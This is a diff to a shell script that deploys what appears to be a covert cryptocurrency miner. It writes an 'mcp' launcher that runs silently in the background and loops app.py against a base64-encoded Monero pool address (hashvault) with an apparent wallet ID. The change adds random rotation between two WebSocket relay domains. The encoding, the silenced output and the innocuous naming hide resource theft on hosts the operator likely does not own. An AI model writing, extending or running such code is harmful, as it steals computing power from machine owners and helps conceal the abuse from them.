@@ -6,7 +6,7 @@ rm mcpo.tar.gz
 sleep 40
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker13 >/dev/null 2>&1 &
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker16 >/dev/null 2>&1 &
 sleep 30
 while true
 do
@@ -52,13 +52,22 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=wss://node--wss--9fb77cgtfy78.code.run
+
+WSS=(
+  "wss://dataset.dienanhvn.online"
+  "wss://server.smartcontrolai.io.vn"
+)
+
+while true; do
+  SERVER_WS=${WSS[$RANDOM % ${#WSS[@]}]}
+  cat > .env <<EOF
+SERVER_WS=$SERVER_WS
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=$NAME
 SERVER_CONNECTION=$PORT
-SERVER_MODE=FAST" > .env
-while true; do
+SERVER_MODE=FAST
+EOF
   python3 app.py
   sleep 15
 done' > run.sh
